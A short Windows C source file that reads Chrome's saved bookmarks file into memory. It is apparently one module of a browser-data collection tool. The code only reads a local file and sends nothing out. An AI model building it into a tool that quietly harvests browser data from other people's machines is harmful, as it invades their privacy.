#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "Chrome.h"

char* GetChromeSavedBookmarks(){
	char chromeBookmarkPath[MAX_PATH_LENGTH];
	CHROME_PATH_BOOKMARKS(chromeBookmarkPath);
	FILE* file = fopen(chromeBookmarkPath, "r");
    if (file == NULL) {
        perror("[-]: Error opening file");
        fprintf(stderr, "[-]: File path: %s\n", chromeBookmarkPath);
        return NULL;
    }
	
    // Calculate the file size
    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    // Allocate memory to store the file content
    char* data = (char*)malloc(fileSize + 1);
    if (data == NULL) {
        perror("[-]: Memory allocation error");
        fclose(file);
        return NULL;
    }

    // Read the file content into the allocated memory
    fread(data, 1, fileSize, file);
    fclose(file);
    data[fileSize] = '\0';
    return data;
}